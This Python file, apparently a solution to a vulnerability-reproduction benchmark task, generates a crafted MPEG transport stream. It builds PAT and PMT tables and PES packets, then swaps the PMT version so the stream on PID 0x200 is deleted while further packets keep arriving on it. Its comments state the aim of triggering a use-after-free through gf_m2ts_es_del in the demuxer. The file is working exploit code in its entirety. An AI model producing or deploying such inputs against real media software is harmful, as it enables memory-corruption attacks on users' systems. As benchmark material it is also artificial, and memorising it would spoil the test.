import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        TS_PACKET_SIZE = 188
        SYNC_BYTE = 0x47

        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    c31 = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if c31 ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def make_packet(pid, payload, cc, pusi=False):
            header = bytearray(4)
            header[0] = SYNC_BYTE
            # TEI=0, PUSI=pusi, Prio=0, PID
            header[1] = (1 if pusi else 0) << 6 | ((pid >> 8) & 0x1F)
            header[2] = pid & 0xFF
            # TSC=0, AFC=1 (Payload only), CC=cc
            header[3] = 0x10 | (cc & 0x0F)
            
            packet = header + payload
            if len(packet) < TS_PACKET_SIZE:
                packet.extend(b'\xff' * (TS_PACKET_SIZE - len(packet)))
            return packet[:TS_PACKET_SIZE]

        def make_pat_section(ts_id, pmt_pid):
            data = bytearray()
            data.extend(struct.pack('>H', ts_id))
            data.append(0xC1) # Res=3, Ver=0, CN=1
            data.append(0x00)
            data.append(0x00)
            
            data.extend(struct.pack('>H', 1))
            data.extend(struct.pack('>H', 0xE000 | pmt_pid))
            
            length = len(data) + 4
            section = bytearray()
            section.append(0x00) # Table ID 0 (PAT)
            section.append(0x80 | ((length >> 8) & 0x0F))
            section[-1] |= 0x30 # Reserved
            section.append(length & 0xFF)
            section.extend(data)
            
            crc = mpeg_crc32(section)
            section.extend(struct.pack('>I', crc))
            return section

        def make_pmt_section(prog_num, pcr_pid, streams, version):
            data = bytearray()
            data.extend(struct.pack('>H', prog_num))
            # Res=3, Ver=version, CN=1
            data.append(0xC0 | ((version & 0x1F) << 1) | 1)
            data.append(0x00)
            data.append(0x00)
            
            data.extend(struct.pack('>H', 0xE000 | pcr_pid))
            data.extend(struct.pack('>H', 0xF000)) # Prog info len 0
            
            for stype, spid in streams:
                data.append(stype)
                data.extend(struct.pack('>H', 0xE000 | spid))
                data.extend(struct.pack('>H', 0xF000)) # ES info len 0
                
            length = len(data) + 4
            section = bytearray()
            section.append(0x02) # Table ID 2 (PMT)
            section.append(0x80 | ((length >> 8) & 0x0F))
            section[-1] |= 0x30
            section.append(length & 0xFF)
            section.extend(data)
            
            crc = mpeg_crc32(section)
            section.extend(struct.pack('>I', crc))
            return section

        packets = bytearray()
        
        # Packet 1: PAT
        # Map Program 1 to PID 0x100
        pat = make_pat_section(1, 0x100)
        packets.extend(make_packet(0, b'\x00' + pat, 0, pusi=True))
        
        # Packet 2: PMT Version 0
        # Map ES 1 (Type 0x11 BIFS) to PID 0x200
        pmt0 = make_pmt_section(1, 0x1FFF, [(0x11, 0x200)], 0)
        packets.extend(make_packet(0x100, b'\x00' + pmt0, 0, pusi=True))
        
        # Packet 3: ES Data on PID 0x200
        # Start a PES packet. This allocates context in the demuxer.
        payload_p3 = b'\x00\x00\x01\xE0' + b'\xAA' * 100
        packets.extend(make_packet(0x200, payload_p3, 0, pusi=True))
        
        # Packet 4: PMT Version 1
        # Map ES 1 to PID 0x201. This implicitly deletes the ES on PID 0x200 via gf_m2ts_es_del.
        pmt1 = make_pmt_section(1, 0x1FFF, [(0x11, 0x201)], 1)
        packets.extend(make_packet(0x100, b'\x00' + pmt1, 1, pusi=True))
        
        # Packet 5: ES Data on PID 0x200 (Continuation)
        # If the demuxer has not properly cleared the context for 0x200 or is processing interleaved,
        # it may access the freed ES structure here.
        packets.extend(make_packet(0x200, b'\xBB' * 100, 1, pusi=False))
        
        # Packet 6: ES Data on PID 0x200 (Continuation)
        packets.extend(make_packet(0x200, b'\xCC' * 100, 2, pusi=False))
        
        return bytes(packets)